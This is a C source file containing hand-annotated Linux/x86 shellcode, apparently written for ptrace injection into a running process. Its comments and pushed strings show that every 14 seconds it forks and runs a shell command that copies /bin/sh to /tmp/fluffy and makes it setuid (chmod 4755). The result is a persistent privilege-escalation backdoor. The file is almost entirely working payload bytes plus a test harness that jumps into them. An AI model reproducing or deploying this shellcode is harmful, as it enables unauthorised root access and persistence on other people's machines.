/*
 * (linux/x86) drops setuid shell as /tmp/fluffy every every 14 secs - 187 bytes
 *
 * This is not an out of the box ready shellcode. It expects a valid return address to be pushed
 * to the stack, prior to activation. It's originaly designed for a ptrace injecter rather than an 
 * exploit. The equivalent .s version of this shellcode, includes stand alone code for testing.
 *
 * - Itzik Kotler <ik@ikotler.org>
 */

char shellcode[] = 

	//
	//  <_setup_sighandler>:
	//

	"\x90"                  // nop
	"\x90"                  // nop 
	"\x60"                  // pusha 
	"\x9c"                  // pushf 
	"\x6a\x30"              // push $0x30 
	"\x58"                  // pop %eax 
	"\x6a\x0e"              // push $0xe 
	"\x5b"                  // pop %ebx 
	"\xeb\x06"              // jmp <_geteip> 

	//
	// <_calc_eip>:
	//

	"\x59"                  // pop %ecx 
	"\x83\xc1\x0d"          // add $0xd,%ecx 
	"\xeb\x05"              // jmp <_continue> 

	//
	// <_geteip>:
	//

	"\xe8\xf5\xff\xff\xff"  // call <_calc_eip> 

	//
	// <_continue>:
	//

	"\xcd\x80"              // int $0x80 
	"\x85\xc0"              // test %eax,%eax 
	"\x75\x04"              // jne <_resumeflow> 
	"\xb0\x1b"              // mov $0x1b,%al 
	"\xcd\x80"              // int $0x80 

	//
	// <_resumeflow>:
	//

	"\x9d"                  // popf 
	"\x61"                  // popa 
	"\xc3"                  // ret 
	"\x89\xe5"              // mov %esp,%ebp 
	"\x6a\x21"              // push $0x21 
	"\x58"                  // pop %eax 
	"\x99"                  // cltd 
	"\x52"                  // push %edx 
	"\x68\x75\x66\x66\x79"  // push $0x79666675 
	"\x68\x70\x2f\x66\x6c"  // push $0x6c662f70 
	"\x68\x2f\x2f\x74\x6d"  // push $0x6d742f2f 
	"\x89\xe3"              // mov %esp,%ebx 
	"\x6a\x04"              // push $0x4 

	//
	// <_doint>:
	//

	"\x59"                  // pop %ecx 
	"\xcd\x80"              // int $0x80 
	"\x85\xc0"              // test %eax,%eax 
	"\x74\x6f"              // je 8048128 <_schedule> 
	"\x01\xc8"              // add %ecx,%eax 
	"\xcd\x80"              // int $0x80 
	"\x85\xc0"              // test %eax,%eax 
	"\x75\x5f"              // jne 8048120 <_waitpid> 
	"\x52"                  // push %edx 
	"\x68\x6e\x2f\x73\x68"  // push $0x68732f6e 
	"\x68\x2f\x2f\x62\x69"  // push $0x69622f2f 
	"\x89\xe3"              // mov %esp,%ebx 
	"\x52"                  // push %edx 
	"\x52"                  // push %edx 
	"\x66\xc7\x04\x24\x2d\x63" // movw $0x632d,(%esp) 
	"\x89\xe6"              // mov %esp,%esi 
	"\x52"                  // push %edx 
	"\x68\x75\x66\x66\x79"  // push $0x79666675 
	"\x68\x70\x2f\x66\x6c"  // push $0x6c662f70 
	"\x68\x2f\x2f\x74\x6d"  // push $0x6d742f2f 
	"\x68\x37\x35\x35\x20"  // push $0x20353537 
	"\x68\x6f\x64\x20\x34"  // push $0x3420646f 
	"\x68\x20\x63\x68\x6d"  // push $0x6d686320 
	"\x68\x66\x79\x20\x3b"  // push $0x3b207966 
	"\x68\x66\x6c\x75\x66"  // push $0x66756c66 
	"\x68\x74\x6d\x70\x2f"  // push $0x2f706d74 
	"\x68\x73\x68\x20\x2f"  // push $0x2f206873 
	"\x68\x62\x69\x6e\x2f"  // push $0x2f6e6962 
	"\x68\x63\x70\x20\x2f"  // push $0x2f207063 
	"\x89\xe7"              // mov %esp,%edi 
	"\xb0\x0b"              // mov $0xb,%al 
	"\x52"                  // push %edx 
	"\x57"                  // push %edi 
	"\x56"                  // push %esi 
	"\x53"                  // push %ebx 
	"\x54"                  // push %esp 
	"\xeb\x92"              // jmp <_doint> 

	//
	// <_waitpid>:
	//

	"\x93"                  // xchg %eax,%ebx 
	"\x31\xc9"              // xor %ecx,%ecx 
	"\x6a\x07"              // push $0x7 
	"\x58"                  // pop %eax 
	"\xcd\x80"              // int $0x80 

	//
	// <_schedule>:
	//

	"\x87\xe5"              // xchg %esp,%ebp 
	"\xe9\x45\xff\xff\xff"; // jmp <_setup_sighandler> 

int main(int argc, char **argv) {
	int *ret;
	ret = (int *)&ret + 2;
	(*ret) = (int) shellcode;
}
